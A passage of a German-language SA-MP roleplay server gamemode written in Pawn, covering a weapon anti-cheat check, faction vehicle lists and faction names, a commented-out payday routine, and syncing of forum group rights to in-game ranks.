	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}

	if( weaponid == 33 || weaponid == 34 ) // Checking Rifles
 	{
	Weaponsx[playerid][Rifles] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}
	if( weaponid >= 35 && weaponid <= 38 ) // Checking Heavy
 	{
	Weaponsx[playerid][Heavy] = weaponid;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return 1;
	}
return 1;
}
CheckWeapons(playerid)
{
	if(PlayerInfo[playerid][pAdmin]>=2002) return 1; // rausnehmen
	new weaponid = GetPlayerWeapon(playerid);//This will cause the "weaponid not defined" Error
 	if(weaponid >= 1 && weaponid <= 15)
 	{
 		if(weaponid == Weaponsx[playerid][Melee])
 		{
 		return 1;
 		}
			else
 			{
					new stringtut[128];
					format(stringtut, sizeof(stringtut), "%s wurde vom Server gekickt, Grund: Waffenhack", GetName(playerid));
					SendClientMessageToAll(COLOR_RED, stringtut);
			        TogglePlayerControllable(playerid, false);
			        SetTimerEx("kicktimerfake", 100,false,"i",playerid);
 			}
		}
		if( weaponid >= 16 && weaponid <= 18 || weaponid == 39 ) // Checking Thrown
 		{
 		if(weaponid == Weaponsx[playerid][Thrown])
 		{
 		return 1;
 		}
			else
 			{
					new stringtut[128];
					format(stringtut, sizeof(stringtut), "%s wurde vom Server gekickt, Grund: Waffenhack", GetName(playerid));
					SendClientMessageToAll(COLOR_RED, stringtut);
			        TogglePlayerControllable(playerid, false);
			        SetTimerEx("kicktimerfake", 100,false,"i",playerid);
 			}
	}
	if( weaponid >= 22 && weaponid <= 24 ) // Checking Pistols
 	{
 		if(weaponid == Weaponsx[playerid][Pistols])
 		{
 		return 1;
 		}
			else
 			{
					new stringtut[128];
					format(stringtut, sizeof(stringtut), "%s wurde vom Server gekickt, Grund: Waffenhack", GetName(playerid));
					SendClientMessageToAll(COLOR_RED, stringtut);
			        TogglePlayerControllable(playerid, false);
			        SetTimerEx("kicktimerfake", 100,false,"i",playerid);
 			}
	}

	if( weaponid >= 25 && weaponid <= 27 ) // Checking Shotguns
 	{
 		if(weaponid == Weaponsx[playerid][Shotguns])
 		{
 		return 1;
 		}
			else
 			{
					new stringtut[128];
					format(stringtut, sizeof(stringtut), "%s wurde vom Server gekickt, Grund: Waffenhack", GetName(playerid));
					SendClientMessageToAll(COLOR_RED, stringtut);
			        TogglePlayerControllable(playerid, false);
			        SetTimerEx("kicktimerfake", 100,false,"i",playerid);
 			}
	}
	if( weaponid == 28 || weaponid == 29 || weaponid == 32 || weaponid == 42|| weaponid == 46) // Checking Sub Machine Guns
 	{
 		if(weaponid == Weaponsx[playerid][SubMachine])
 		{
 		return 1;
 		}
			else
 			{
					new stringtut[128];
					format(stringtut, sizeof(stringtut), "%s wurde vom Server gekickt, Grund: Waffenhack", GetName(playerid));
					SendClientMessageToAll(COLOR_RED, stringtut);
			        TogglePlayerControllable(playerid, false);
			        SetTimerEx("kicktimerfake", 100,false,"i",playerid);
 			}
	}

	if( weaponid == 30 || weaponid == 31 ) // Checking Assault
 	{
 		if(weaponid == Weaponsx[playerid][Assault])
 		{
 		return 1;
 		}
			else
 			{
					new stringtut[128];
					format(stringtut, sizeof(stringtut), "%s wurde vom Server gekickt, Grund: Waffenhack", GetName(playerid));
					SendClientMessageToAll(COLOR_RED, stringtut);
			        TogglePlayerControllable(playerid, false);
			        SetTimerEx("kicktimerfake", 100,false,"i",playerid);
 			}
	}

	if( weaponid == 33 || weaponid == 34 ) // Checking Rifles
 	{
 		if(weaponid == Weaponsx[playerid][Rifles])
 		{
 		return 1;
 		}
			else
 			{
					new stringtut[128];
					format(stringtut, sizeof(stringtut), "%s wurde vom Server gekickt, Grund: Waffenhack", GetName(playerid));
					SendClientMessageToAll(COLOR_RED, stringtut);
			        TogglePlayerControllable(playerid, false);
			        SetTimerEx("kicktimerfake", 100,false,"i",playerid);
 			}
	}
	if( weaponid >= 35 && weaponid <= 38 ) // Checking Heavy
 	{
 		if(weaponid == Weaponsx[playerid][Heavy])
 		{
 		return 1;
 		}
			else
 			{
					new stringtut[128];
					format(stringtut, sizeof(stringtut), "%s wurde vom Server gekickt, Grund: Waffenhack", GetName(playerid));
					SendClientMessageToAll(COLOR_RED, stringtut);
			        TogglePlayerControllable(playerid, false);
			        SetTimerEx("kicktimerfake", 100,false,"i",playerid);
 			}
	}
	else { return 1; }

return 1;
}
/*
PUBLIC: JB::PutPlayerInVehicle (playerid, vehicleid, seatid)
{
	if (IsPlayerConnected (playerid) && vehicleid != INVALID_VEHICLE_ID)
	{
		if (PutPlayerInVehicle (playerid, vehicleid, seatid))
		{
		    SetSyncTime (playerid, SYNC_TYPE_POS);
			JB::PlayerInfo [playerid][JB::pLastVehicle] = vehicleid;
			JB::PlayerInfo [playerid][JB::pVehicleEntered] = vehicleid;
 			return 1;
		}
	}
	return 0;
}
PUBLIC: JB::SetPlayerPos (playerid, Float: x, Float: y, Float: z)
{
	if (IsPlayerConnected (playerid))
	{
		if (SetPlayerPos (playerid, x, y, z))
		{
			JB::PlayerInfo [playerid][JB::pCurrentPos][0] = x;
			JB::PlayerInfo [playerid][JB::pCurrentPos][1] = y;
			JB::PlayerInfo [playerid][JB::pCurrentPos][2] = z;
			JB::PlayerInfo [playerid][JB::pSetPos][0] = x;
			JB::PlayerInfo [playerid][JB::pSetPos][1] = y;
			JB::PlayerInfo [playerid][JB::pSetPos][2] = z;
   			SetSyncTime (playerid, SYNC_TYPE_POS);
			return 1;
		}
	}
	return 0;
}
PUBLIC: JB::SetPlayerPosFindZ (playerid, Float: x, Float: y, Float: z)
{
	if (IsPlayerConnected (playerid))
	{
		if (SetPlayerPosFindZ (playerid, x, y, z))
		{
			JB::PlayerInfo [playerid][JB::pCurrentPos][0] = x;
			JB::PlayerInfo [playerid][JB::pCurrentPos][1] = y;
			JB::PlayerInfo [playerid][JB::pCurrentPos][2] = z;
			JB::PlayerInfo [playerid][JB::pSetPos][0] = x;
			JB::PlayerInfo [playerid][JB::pSetPos][1] = y;
			JB::PlayerInfo [playerid][JB::pSetPos][2] = z;
			SetSyncTime (playerid, SYNC_TYPE_POS);
			return 1;
		}
	}
	return 0;
}
PUBLIC: JB::SetVehiclePos (vehicleid, Float: x, Float: y, Float: z)
{
	if (vehicleid != INVALID_VEHICLE_ID)
	{
	    JB::VehiclePos [vehicleid][0] = x;
	    JB::VehiclePos [vehicleid][1] = y;
	    JB::VehiclePos [vehicleid][2] = z;
		if (SetVehiclePos (vehicleid, x, y, z))
		{

			Player (i)
			{
				if (GetPlayerVehicleID (i) == vehicleid)
				{
					JB::PlayerInfo [i][JB::pCurrentPos][0] = x;
					JB::PlayerInfo [i][JB::pCurrentPos][1] = y;
					JB::PlayerInfo [i][JB::pCurrentPos][2] = z;
					JB::PlayerInfo [i][JB::pSetPos][0] = x;
					JB::PlayerInfo [i][JB::pSetPos][1] = y;
					JB::PlayerInfo [i][JB::pSetPos][2] = z;
					SetSyncTime (i, SYNC_TYPE_POS);
				}
			}
			return 1;
		}
	}
	return 0;
}
PUBLIC: JB::SetPlayerRaceCheckpoint (playerid, type, Float: x, Float: y, Float: z, Float: nextx, Float: nexty, Float: nextz, Float: size)
{
	if (IsPlayerInRangeOfPoint (playerid, (size + 5.0), x, y, z))//Prevent that spawning a checkpoint near a player counts as checkpoint teleport.
		SetSyncTime (playerid, SYNC_TYPE_POS);
	return SetPlayerRaceCheckpoint (playerid, type, x, y, z, nextx, nexty, nextz, size);
}

PRIVATE: SetSyncTime (playerid, synctype, base = 3)
{
	if (!IsPlayerConnected (playerid) || synctype < 0 || synctype >= MAX_SYNC_TYPES)
	    return 0;

    JB::SyncInfo [playerid][synctype][JB::sSyncTime] = base;
	JB::SyncInfo [playerid][synctype][JB::sLastSyncUpdate] = GetTickCount ();
	return 1;
}
*/




ocmd:carlist(playerid)
{
	new string[5012];
	DialogTempIndexCarlist[playerid] = 0;
    for(new i; i < MAX_FACTION_CARS; i++)
	{
	    if(FactionCars[i][fVehid] >= 400 && FactionCars[i][fVehid] <= 611)
		{
			if(FactionCars[i][fFaction] == PlayerInfo[playerid][sMember])
			{

				DialogTempCarlist[playerid][DialogTempIndexCarlist[playerid]++] = FactionCars[i][fVehid];

				if(FactionCars[i][fTuning][17] == 1)
				{
	       		    format(string, sizeof(string), "%s{FF0000}Abgeschleppt! Fahrzeug: %s | CarID: %d | Kilometer: %d | Tank: %dl{FFFFFF}\n", string,CarName[FactionCars[i][fVehid]-400], FactionCars[i][fCarid],FactionCars[i][fTuning][15],FactionCars[i][fTuning][16]);
	    		}
				//		{FF0000}%s Abgeschleppt{FFFFFF}
				else
				{
	       	 	    format(string, sizeof(string), "%sFahrzeug: %s | CarID: %d | Kilometer: %d | Tank: %dl\n", string,CarName[FactionCars[i][fVehid]-400], FactionCars[i][fCarid],FactionCars[i][fTuning][15],FactionCars[i][fTuning][16]);
	    		}
	    	}
		}
	}
	if(DialogTempIndexCarlist[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Deine Fraktion hat keine Fahrzeuge!");
		return 1;
	}
	ShowPlayerDialog(playerid,DIALOG_CARLIST,DIALOG_STYLE_LIST,"Fraktionsfahrzeuge",string,"Auswählen","Abbrechen");
	return 1;
}
stock GetPlayerFraktionName(playerid)
{
    						new getfraktionname[128];
                            if(PlayerInfo[playerid][sMember] == 1)
                            {
                                getfraktionname = "LSPD";
                            }
                            else if(PlayerInfo[playerid][sMember] == 2)
                            {
                                getfraktionname = "F.B.I";
                            }
                            else if(PlayerInfo[playerid][sMember] == 3)
                            {
                                getfraktionname = "Bundeswehr";
                            }
                            else if(PlayerInfo[playerid][sMember] == 4)
                            {
                                getfraktionname = "Sanitäter";
                            }
                            else if(PlayerInfo[playerid][sMember] == 5)
                            {
                                getfraktionname = "Los Chicken Malos";
                            }
                            else if(PlayerInfo[playerid][sMember] == 6)
                            {
                                getfraktionname = "Yakuza";
                            }
                            else if(PlayerInfo[playerid][sMember] == 7)
                            {
                                getfraktionname = "Regierung";
                            }
                            else if(PlayerInfo[playerid][sMember] == 8)
                            {
                                getfraktionname = "Hitman";
                            }
                            else if(PlayerInfo[playerid][sMember] == 9)
                            {
                                getfraktionname = "San News";
                            }
                            else if(PlayerInfo[playerid][sMember] == 10)
                            {
                                getfraktionname = "Transport GmbH";
                            }
                            else if(PlayerInfo[playerid][sMember] == 11)
                            {
                                getfraktionname = "Fahrlehrer";
                            }
                            else if(PlayerInfo[playerid][sMember] == 12)
                            {
                                getfraktionname = "Triaden";
                            }
                            else if(PlayerInfo[playerid][sMember] == 13)
                            {
                                getfraktionname = "Grove Street";
                            }
                            else if(PlayerInfo[playerid][sMember] == 14)
                            {
                                getfraktionname = "Ballas";
                            }
                            else if(PlayerInfo[playerid][sMember] == 15)
                            {
                                getfraktionname = "Los Santos Biker Club";
                            }
                            else if(PlayerInfo[playerid][sMember] == 16)
                            {
                                getfraktionname = "LS Vagos";
                            }
                            else if(PlayerInfo[playerid][sMember] == 17)
                            {
                                getfraktionname = "Aztecas";
                            }
                            else if(PlayerInfo[playerid][sMember] == 18)
                            {
                                getfraktionname = "SF Rifa";
                            }
                            else if(PlayerInfo[playerid][sMember] == 19)
                            {
                                getfraktionname = "Red Soldiers";
                            }
                            else if(PlayerInfo[playerid][sMember] == 20)
                            {
                                getfraktionname = "Terroristen";
                            }
                            else if(PlayerInfo[playerid][sMember] == 21)
                            {
                                getfraktionname = "Wheelman";
                            }
                            else if(PlayerInfo[playerid][sMember] == 22)
                            {
                                getfraktionname = "S.W.A.T";
                            }
                            else if(PlayerInfo[playerid][sMember] == 23)
                            {
                                getfraktionname = "Russen Mafia";
                            }
                            else if(PlayerInfo[playerid][sMember] == 24)
                            {
                                getfraktionname = "Ordnungsamt";
                            }
							return getfraktionname;
}
/*
forward WBB_CheckPassword(playerid, password[]);
public WBB_CheckPassword(playerid, password[]) {
	new buffer[128], postData[128];
	format(postData, sizeof postData, "&request=wbb_checkPassword&username=%s&password=%s", GetName(playerid), password);
	SendWbbApiRequest ( postData, buffer, sizeof buffer);
	return strval(buffer);
}
forward WBB_BanUser(playerid, groupID);
public WBB_BanUser(playerid, groupID)
{
	new buffer[128], postData[ 128 ];
	format(postData, sizeof postData, "&request=wbb_setuserbanstate&username=%s&groupID=%d", GetName(playerid), groupID);
	SendWbbApiRequest(postData, buffer, sizeof buffer);
	return buffer[0] == '1' ? true : false;
}
forward WBB_AddUserToGroup(playerid, groupID);
public WBB_AddUserToGroup(playerid, groupID) {
	new buffer[128], postData[ 128 ];
	format(postData, sizeof postData, "&request=wbb_setUserToGroup&username=%s&groupID=%d", GetName(playerid), groupID);
	SendWbbApiRequest(postData, buffer, sizeof buffer);
	return buffer[0] == '1' ? true : false;
}
forward WBB_RemoveUserFromGroup(playerid, groupID);
public WBB_RemoveUserFromGroup(playerid, groupID) {
	new buffer[128], postData[128];
	format(postData , sizeof postData, "&request=wbb_removeUserFromGroup&username=%s&groupID=%d" , GetName(playerid), groupID);
	SendWbbApiRequest(postData, buffer , sizeof buffer);
	return buffer[0] == '1' ? true : false;
}
forward WBB_GetUserID(playerid);
public WBB_GetUserID(playerid) {
	new buffer[128], postData[128];
	format(postData ,sizeof postData, "&request=wbb_getId&username=%s", GetName(playerid));
	SendWbbApiRequest(postData, buffer, sizeof buffer);
	return strval(buffer);
}
SendWbbApiRequest(PostData[],Result[],Length)
{
	new httpStatus = SynchronizedHTTP (WBB_CONNECT_URL, PostData , Result , Length , HTTP_GET , 5 , true);
	if(httpStatus == 200)
	{
		return true;
	}
	else
	{
		return false;
	}
}
*/

/*


stock GivePlayerForumRechte(playerid)
{
						new level = PlayerInfo[playerid][sMember];
					    if(level == 0)
					    {
							WBB_RemoveUserFromGroup(playerid, 48);
							WBB_RemoveUserFromGroup(playerid, 49);
							WBB_RemoveUserFromGroup(playerid, 51);
							WBB_RemoveUserFromGroup(playerid, 53);
							WBB_RemoveUserFromGroup(playerid, 59);
							WBB_RemoveUserFromGroup(playerid, 61);
							WBB_RemoveUserFromGroup(playerid, 47);
							WBB_RemoveUserFromGroup(playerid, 56);
							WBB_RemoveUserFromGroup(playerid, 54);
							WBB_RemoveUserFromGroup(playerid, 74);
							WBB_RemoveUserFromGroup(playerid, 55);
							WBB_RemoveUserFromGroup(playerid, 73);
							WBB_RemoveUserFromGroup(playerid, 57);
							WBB_RemoveUserFromGroup(playerid, 63);
							WBB_RemoveUserFromGroup(playerid, 72);
							WBB_RemoveUserFromGroup(playerid, 71);
							WBB_RemoveUserFromGroup(playerid, 70);
							WBB_RemoveUserFromGroup(playerid, 69);
							WBB_RemoveUserFromGroup(playerid, 68);
							WBB_RemoveUserFromGroup(playerid, 58);
							WBB_RemoveUserFromGroup(playerid, 62);
							WBB_RemoveUserFromGroup(playerid, 50);
							WBB_RemoveUserFromGroup(playerid, 60);
							WBB_RemoveUserFromGroup(playerid, 52);
						}
					    else if(level == 1)
					    {

							WBB_AddUserToGroup(playerid, 48);
						}
					    else if(level == 2)
					    {

							WBB_AddUserToGroup(playerid, 49);
						}
					    else if(level == 3)
					    {

							WBB_AddUserToGroup(playerid, 51);
						}
					    else if(level == 4)
					    {

							WBB_AddUserToGroup(playerid, 53);
						}
					    else if(level == 5)
					    {

							WBB_AddUserToGroup(playerid, 59);
						}
					    else if(level == 6)
					    {

							WBB_AddUserToGroup(playerid, 61);
						}
					    else if(level == 7)
					    {

							WBB_AddUserToGroup(playerid, 47);
						}
					    else if(level == 8)
					    {

							WBB_AddUserToGroup(playerid, 56);
						}
					    else if(level == 9)
					    {

							WBB_AddUserToGroup(playerid, 54);
						}
					    else if(level == 10)
					    {

							WBB_AddUserToGroup(playerid, 74);
						}
					    else if(level == 11)
					    {

							WBB_AddUserToGroup(playerid, 55);
						}
					    else if(level == 12)
					    {

							WBB_AddUserToGroup(playerid, 73);
						}
					    else if(level == 13)
					    {

							WBB_AddUserToGroup(playerid, 57);
						}
					    else if(level == 14)
					    {

							WBB_AddUserToGroup(playerid, 63);
						}
					    else if(level == 15)
					    {

							WBB_AddUserToGroup(playerid, 72);
						}
					    else if(level == 16)
					    {

							WBB_AddUserToGroup(playerid, 71);
						}
					    else if(level == 17)
					    {

							WBB_AddUserToGroup(playerid, 70);
						}
					    else if(level == 18)
					    {

							WBB_AddUserToGroup(playerid, 69);
						}
					    else if(level == 19)
					    {

							WBB_AddUserToGroup(playerid, 68);
						}
					    else if(level == 20)
					    {

							WBB_AddUserToGroup(playerid, 58);
						}
					    else if(level == 21)
					    {

							WBB_AddUserToGroup(playerid, 62);
						}
					    else if(level == 22)
					    {

							WBB_AddUserToGroup(playerid, 50);
						}
					    else if(level == 23)
					    {

							WBB_AddUserToGroup(playerid, 60);
						}
					    else if(level == 24)
					    {

							WBB_AddUserToGroup(playerid, 52);
						}
				return 1;
}
*/
forward fcreate(filename[]);
public fcreate(filename[])
{
    if (fexist(filename)){return false;}
    new File:fmysqlcon = fopen(filename,io_write);
    fclose(fmysqlcon);
    return true;
}




/*
forward forcepayday(playerid);
public forcepayday(playerid)
{
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
		if(IsPlayerConnected(i))
		{
			PlayerInfo[i][pGesamtMinutes]++;
			PlayerInfo[i][pMinutesSinceLogin]++;
			PlayerInfo[i][pMinutesSinceAn]++;

			PlayerInfo[i][pPlayMinutes] = 61;

			PlayerInfo[i][pMinutesSinceLogin] = 241;




			if(PlayerInfo[i][pPlayMinutes] <= 60)
			{
			    PlayerInfo[i][pPlayMinutes]++;
			}
			if(PlayerInfo[i][pPlayMinutes] >= 60)
			{
			 	PlayerInfo[i][pPlayMinutes] = 0;
	 			new string[128];
				new account,interest;
				new rent = 0;
				if(IsPlayerConnected(i))
				{
						new playername2[MAX_PLAYER_NAME];
						GetPlayerName(i, playername2, sizeof(playername2));
						account = PlayerInfo[i][pAccount];
						new key = PlayerInfo[i][pHouseKey];
						if(key != 999)
						{
							rent = HouseInfo[key][hRent];
							if(strcmp(playername2, HouseInfo[key][hOwner], true) == 0)
							{
								rent = 0;
							}
							else if(rent > GetPlayerMoneySave(i))
							{
								PlayerInfo[i][pHouseKey] = 999;
								SendClientMessage(i, COLOR_WHITE, "Du wurdest aus der Wohnung geschmissen!");
								rent = 0;
							}
							HouseInfo[key][hTakings] = HouseInfo[key][hTakings]+rent;
						}
						new tmpintrate;
						if (key != 999 && strcmp(playername2, HouseInfo[key][hOwner], true) == 0)
						{
						    if(PlayerInfo[i][pDonateRank] > 0)
							{
								tmpintrate = intrate+4;
							}
							else
							{
								tmpintrate = intrate+2;
							}//HouseInfo[key][hLevel]
						}
						else
						{
						    if(PlayerInfo[i][pDonateRank] > 0)
					 		{
						  		tmpintrate = 3;
						  	}
							else
						 	{
							 	tmpintrate = 1;
						 	}
						}
						if(PlayerInfo[i][pPbiskey] > 0)
						{
						    tmpintrate++;
						}
						new fraktion = 0;
						new checks;
		 				if(PlayerInfo[i][pMember] > 0) fraktion = PlayerInfo[i][pMember] - 1;
		  				if(PlayerInfo[i][pLeader] > 0) fraktion = PlayerInfo[i][pLeader] - 1;
						if(fraktion >= 0)
						{
		    				if(FraktionsKasse[fraktion] - PlayerInfo[i][pGehalt] < 0)
					    	{
						    	checks = 0;
						    	GivePlayerMoneySave(i, checks);
							}
							else if(FraktionsKasse[fraktion] - PlayerInfo[i][pGehalt] >= 0)
							{
			    				checks = PlayerInfo[i][pGehalt];
						    	GivePlayerMoneySave(i, checks);
								FraktionsKasse[fraktion] -= checks;
							}
						}
						else if(PlayerInfo[i][pJob] != 0 || PlayerInfo[i][pMember] == 0 || PlayerInfo[i][pLeader] == 0)
						{
							checks = 500;
							GivePlayerMoneySave(i, checks);
						}//Should work for every player online
				    	PlayerInfo[i][pAccount] -= Tax;
				    	if(PlayerInfo[i][pDonateRank] > 0)
						{
		    				new bonus = PlayerInfo[i][pPayCheck] / 2;
						    PlayerInfo[i][pPayCheck] += bonus;
						}
						new ebill = (PlayerInfo[i][pAccount]/10000)*(PlayerInfo[i][pLevel]);
		    			//new oil = (PlayerInfo[i][pHouseKey]*100);
					    ConsumingMoney[i] = 1;
					    if(PlayerInfo[i][pAccount] > 0)
					    {
					   		PlayerInfo[i][pAccount] -= ebill;
					    	SBizzInfo[4][sbTill] += ebill/5;
						}
						else
						{
		    				ebill = 0;
						}
						interest = (PlayerInfo[i][pAccount]/1000)*(tmpintrate);
						//PlayerInfo[i][pExp]++;
						PlayerPlayMusic(i);
						PlayerInfo[i][pAccount] = account+interest;
						SendClientMessage(i, COLOR_YELLOW, "|================| Gehalts-Check |================|");
						format(string, sizeof(string), "  Gehalt: $%d  Miete: -$%d  Steuern: -$%d", checks, rent, Tax);
						SendClientMessage(i, COLOR_GRAD1, string);
						if(PlayerInfo[i][pHouseKey] != 999 || PlayerInfo[i][pPbiskey] != 255)
						{
		    				format(string, sizeof(string), "  Strom Kosten: -$%d", ebill);
							SendClientMessage(i, COLOR_GRAD1, string);
						}
						if(PlayerInfo[i][pDonateRank] >= 1)
						{
						    PlayerInfo[i][pExp]++;
						    PlayerInfo[i][pExp]++;
						    PlayerInfo[i][pExp]++;
						    SendClientMessage(i, COLOR_GRAD1, "  Du hast 3 Respektpunkte erhalten.");
						}
						else {
						    PlayerInfo[i][pExp]++;
						    SendClientMessage(i, COLOR_GRAD1, "  Du hast 1 Respektpunkt erhalten.");
						}
						if(PlayerInfo[i][pPlayerKreditDauer] > 0)
						{
						    PlayerInfo[i][pAccount] -= PlayerInfo[i][pPlayerKredit];
						    PlayerInfo[i][pPlayerKreditDauer]--;
							format(string, sizeof(string), "  Kreditrate: -%d", PlayerInfo[i][pPlayerKredit]);
							SendClientMessage(i, COLOR_GRAD1, string);
						}
						format(string, sizeof(string), "  Zinsen: $%d [0.%d Prozent]", interest,tmpintrate);
						SendClientMessage(i, COLOR_GRAD2, string);
						SendClientMessage(i, COLOR_YELLOW, "|=================||============||==============|");
						format(string, sizeof(string), "  Neuer Kontostand: $%d", PlayerInfo[i][pAccount]);
						SendClientMessage(i, COLOR_GRAD5, string);
						format(string, sizeof(string), "~g~Pay Day");
						GameTextForPlayer(i, string, 5000, 1);
						if(checks == 0 && FrakMember(i) && PlayerInfo[i][pJob] == 0)
						{
		    				SendClientMessage(i,COLOR_LIGHTRED, "Da die Fraktionskasse leer ist bekommst du kein Gehalt!");
						}
						rent = 0;
						PlayerInfo[i][pPayCheck] = 0;
						PlayerInfo[i][pConnectTime] += 1;
						if(PlayerInfo[i][pZollPassTime] >= 25)
						{
							PlayerInfo[i][pZollPass] = 0;
							PlayerInfo[i][pZollPassTime] = 0;
							format(string, sizeof(string), "* Dein Zollpass ist nun nicht mehr gültig und vom Staat als ungültig anerkannt.");
							SendClientMessage(i, COLOR_LIGHTRED, string);
						}
                        // Automatisches Level system
			        	if(PlayerInfo[i][pLevel] >= 0)
		           		{
		            		new nxtlevel = PlayerInfo[i][pLevel]+1;
		        			new expamount = nxtlevel*levelexp;
	        				new infostring[256];

				    	if (PlayerInfo[i][pExp] < expamount)
				     	{
				     	}
				    	else
				    	{
						format(string, sizeof(string), "~g~LEVEL UP~n~~w~Du bist jetzt Level %d", nxtlevel);
						GameTextForPlayer(i, string, 5000, 1);
						PlayerPlaySound(i, 1052, 0.0, 0.0, 0.0);
						PlayerPlayMusic(i);
						PlayerInfo[i][pLevel]++;
						if(PlayerInfo[i][pDonateRank] > 0)
						{
						    PlayerInfo[i][pExp] -= expamount;
						    new total = PlayerInfo[i][pExp];
						    if(total > 0)
						    {
						        PlayerInfo[i][pExp] = total;
						    }
						    else
						    {
						        PlayerInfo[i][pExp] = 0;
						    }
						}
						else
						{
							PlayerInfo[i][pExp] = 0;
						}
						PlayerInfo[i][gPupgrade] = PlayerInfo[i][gPupgrade]+2;
						format(infostring, 256, "Du hast %d Upgrade Punkte",PlayerInfo[i][gPupgrade]);
						SendClientMessage(i, COLOR_GRAD1, infostring);
					    }
			        	}
                        // Ende
						if(PlayerInfo[i][pZollPass] == 1)
						{
							PlayerInfo[i][pZollPassTime] += 1;
							format(string, sizeof(string), "* Du nutzt deinen Zollpass nun schon seit %d PayDays.", PlayerInfo[i][pZollPassTime]);
							SendClientMessage(i, COLOR_LIGHTBLUE, string);
						}
						if(PlayerInfo[i][pDonateRank] > 0)
						{
		    				PlayerInfo[i][pPayDayHad] += 1;
					    	if(PlayerInfo[i][pPayDayHad] >= 5)
						    {
		        				PlayerInfo[i][pExp]++;
						        PlayerInfo[i][pPayDayHad] = 0;
						    }
						}



						if(PlayerInfo[i][pMinutesSinceLogin] > 240)
						{

										new string3 = random(25000000000);

										new ahh43444[128];

										new ahh434[128];

										new value = random(7);

										if(value == 0)
										{
										value = 1;
										}
								        format(ahh434, sizeof(ahh434), "/gutscheine/%d.ini",string3);
										dini_Create(ahh434);

										dini_IntSet(ahh434, "result", value);

										SendClientMessage(i, COLOR_NEWS, "Aktivitätsbonus! 4 Stunden Online");
						                format(ahh43444, sizeof(ahh43444), "* Du hast einen Gutschein erhalten! Code: %d", string3);
										SendClientMessage(i, COLOR_LIGHTBLUE, ahh43444);
						}



					}

					else
					{
					    SendClientMessage(i, COLOR_LIGHTRED, "* Du hast kannst keinen PayDay bekommen, solange du AFK bist!");
					}
				}

			}
		}
//	}
	return 1;
}*/

public IsPlayerAdminCall (playerid)
	return (PlayerInfo [playerid][pAdmin] >= 1);


stock GivePlayerForumRightsAdmin(playerid,rang,oldrang)
{




    if(oldrang == 2 && rang == 2)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "11");
		return 1;
	}
    if(oldrang == 4 && rang == 4)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "10");
		return 1;
	}
    if(oldrang == 1337 && rang == 1337)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "9");
		return 1;
	}
    if(oldrang == 1338 && rang == 1338)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "8");
		return 1;
	}
    if(oldrang == 2000 && rang == 2000)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "7");
		return 1;
	}
    if(oldrang == 2001 && rang == 2001)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "6");
		return 1;
	}
    if(oldrang == 2002 && rang == 2002)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "5");
		return 1;
	}








    if(rang == 0)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "5,6,7,8,9,10,11");
	}
    if(oldrang == 2)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "11");
	}
    if(oldrang == 4)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "10");
	}
    if(oldrang == 1337)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "9");
	}
    if(oldrang == 1338)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "8");
	}
    if(oldrang == 2000)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "7");
	}
    if(oldrang == 2001)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "6");
	}
    if(oldrang == 2002)
    {
		WBB_RemoveFromGroups(PlayerInfo[playerid][pWBBid], "5");
	}



    if(rang == 2)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "11");
	}
    if(rang == 4)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "10");
	}
    if(rang == 1337)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "9");
	}
    if(rang == 1338)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "8");
	}
    if(rang == 2000)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "7");
	}
    if(rang == 2001)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "6");
	}
    if(rang == 2002)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "5");
	}
	return 1;
}

stock GivePlayerForumRights(playerid,rang,oldrang)
{



printf("Newrang %d, oldrang %d",rang,oldrang);  //-> The number is 42.

//Newrang 9, oldrang 7 geht nicht

//Newrang 1, oldrang 0 geht

    if(oldrang == 1 && rang == 1)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "12");
		return 1;
	}
    if(oldrang == 2 && rang == 2)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "13");
		return 1;
	}
    if(oldrang == 3 && rang == 3)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "14");
		return 1;
	}
    if(oldrang == 4 && rang == 4)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "15");
		return 1;
	}
    if(oldrang == 5 && rang == 5)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "16");
		return 1;
	}
    if(oldrang == 6 && rang == 6)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "17");
		return 1;
	}
    if(oldrang == 7 && rang == 7)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "18");
		return 1;
	}
    if(oldrang == 8 && rang == 8)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "19");
		return 1;
	}
    if(oldrang == 9 && rang == 9)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "20");
		return 1;
	}
    if(oldrang == 10 && rang == 10)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "21");
		return 1;
	}
    if(oldrang == 11 && rang == 11)
    {
		WBB_AddToGroups(PlayerInfo[playerid][pWBBid], "22");
		return 1;
	}
    if(oldrang == 12 && rang == 12)
    {
